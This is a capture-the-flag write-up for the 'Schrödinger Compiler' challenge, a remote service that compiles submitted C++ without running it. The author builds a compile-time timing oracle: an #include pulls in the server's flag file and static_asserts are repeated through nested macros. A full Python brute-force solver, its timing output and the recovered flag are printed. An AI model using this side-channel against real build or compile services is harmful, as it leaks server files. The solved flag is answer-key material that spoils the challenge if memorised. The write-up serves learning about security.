The challenge is given as this script:
```
#!/bin/sh

echo "[+] Welcome to the Schrödinger Compiler"
echo "[+] We definitely don't have a flag in /flag.txt"
echo "[+] Timeout is 3 seconds, you can run it locally with deploy.sh"

echo ""

echo "[+] Submit the base64 (EOF with a '@') of a .tar.gz compressed "
echo "    .cpp file and we'll compile it for you"
echo "[+] Example: tar cz main.cpp | base64 ; echo "@""
echo "[>] --- BASE64 INPUT START ---"
read -d @ FILE
echo "[>] --- BASE64 INPUT END ---"

DIR=$(mktemp -d)
cd ${DIR} &> /dev/null
echo "${FILE}" | base64 -d 2>/dev/null | tar -xzO > main.cpp 2> /dev/null
ls -l
echo "[+] Compiling with g++ main.cpp &> /dev/null"
g++ main.cpp &> /dev/null
# ./main
# oops we fogot to run it
echo "[+] Bye, it was a pleasure! Come back soon!"
```

This script compiles a `main.cpp` file you supply with `g++`, but does not run it. The output of the compilation is also not returned in stdout or stderr and the other challenge files indicate there is a three second timeout. The trick here is to get information out of the compile process through some other means.

Using some inspiration from this writeup (https://github.com/welchbj/ctf/blob/master/docs/miscellaneous.md#error-code-oracles) on Error Code Oracles and this writeup for a "compilerbot" challenge in another CTF (https://ctftime.org/writeup/17952), I had a way to include the flag in the `main.cpp` file at compile time.

I chose to use a timing oracle to get information out of the compilation process but I needed a way to get the compilation to take a long (or short) time for errors the compilation. After searching for a while I ended up using the `static_assert()` directive. To get the timing to take a while, I used a rudimentary nested `#define` expansion to get the same line of code many times in expanded, pre-processed code. A main.cpp file like the following seemed to get the timing about right for the challenge:

```cpp
int main() {
static constexpr const char flag_string[] =
#include "../../flag.txt"
;
#define a static_assert(flag_string[%d] == '%c');
#define b a a a a a a a
#define c b b b b b b b
#define d c c c c c c c
#define e d d d d d d d
#define f e e e e e e e
#define g f f f f f f f
#define h g g g g g g g
#define i h h h h h h h
#define j i i i i i i i
e;
}
```

where the `%d` and `%c` values are filled in to brute force the flag character at each index. Wrapping this all up into one script, I can brute force the flag in a couple minutes:

```python
#!/usr/bin/env python3

import subprocess
import socket
import time
import base64
import time
import string

BUFSIZE = 1024
DEBUG = False

def readuntil(s,val):
    buf = b''
    while not buf.endswith(val):
        ret = s.recv(BUFSIZE)
        buf = buf + ret
        if DEBUG and len(buf)%16 == 0:
            print(buf)
        if len(ret) == 0:
            break
    if DEBUG:
        print(buf)
    return buf

def sendall(s,buf):
    if DEBUG:
        print('>>', buf)
    n = s.send(buf)

def chal_exec(i=0,ch='g'):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    #s.connect(('localhost',1337))
    s.connect(('challs.glacierctf.com',13372))

    prog = '''int main() {
static constexpr const char flag_string[] =
#include "../../flag.txt"
;
#define a static_assert(flag_string[%d] == '%c');
#define b a a a a a a a
#define c b b b b b b b
#define d c c c c c c c
#define e d d d d d d d
#define f e e e e e e e
#define g f f f f f f f
#define h g g g g g g g
#define i h h h h h h h
#define j i i i i i i i
e;
}
''' % (i,ch)

    with open('main.cpp','wb') as fhandle:
        fhandle.write(prog.encode())
        fhandle.close()

    res = subprocess.Popen(['tar','cz','main.cpp'],stdout=subprocess.PIPE).communicate()[0]
    readuntil(s,b'[>] --- BASE64 INPUT START ---\n')

    t = time.time()
    sendall(s,base64.b64encode(res)+b'@\n')
    while True:
        res = s.recv(1024)
        #print(res.decode())
        if len(res) == 0:
            break
    t = time.time()-t
    print(i,ch,t)
    return t

if __name__ == '__main__':
    t0 = chal_exec(0,'f')
    t1 = chal_exec(0,'g')
    t2 = chal_exec(0,'h')

    threshold = (((t0+t2)/2) + t1) / 2 # will depend on the latency of your network

    ans = '' # gctf{1420_1S_Th3_C0mP1ler_D34D_0R_4l1v3_2928}
    for i in range(len(ans),50):
        for ch in "{}" + string.digits + "_" + string.ascii_lowercase + string.ascii_uppercase:
            t = chal_exec(i,ch)
            if t < threshold:
                ans = ans + ch
                print('found answer:',ans)
                break
```

The output from the script looks like:

```
$ ./solve.py
0 f 0.32239699363708496
0 g 0.2005460262298584
0 h 0.3237192630767822
0 { 0.3208949565887451
0 } 0.3365519046783447
0 0 0.31276416778564453
0 1 0.3241081237792969
0 2 0.32456421852111816
0 3 0.3121967315673828
0 4 0.31543397903442383
0 5 0.33190202713012695
0 6 0.32513880729675293
0 7 0.33641862869262695
0 8 0.3229410648345947
0 9 0.32616090774536133
0 _ 0.3277008533477783
0 a 0.312075138092041
0 b 0.3191192150115967
0 c 0.3443782329559326
0 d 0.33722710609436035
0 e 0.3113877773284912
0 f 0.344249963760376
0 g 0.21387171745300293
found answer: g
1 { 0.3224811553955078
...
43 6 0.32977795600891113
43 7 0.32803988456726074
43 8 0.2041459083557129
found answer: gctf{1420_1S_Th3_C0mP1ler_D34D_0R_4l1v3_2928
44 { 0.32526302337646484
44 } 0.2021172046661377
found answer: gctf{1420_1S_Th3_C0mP1ler_D34D_0R_4l1v3_2928}
```

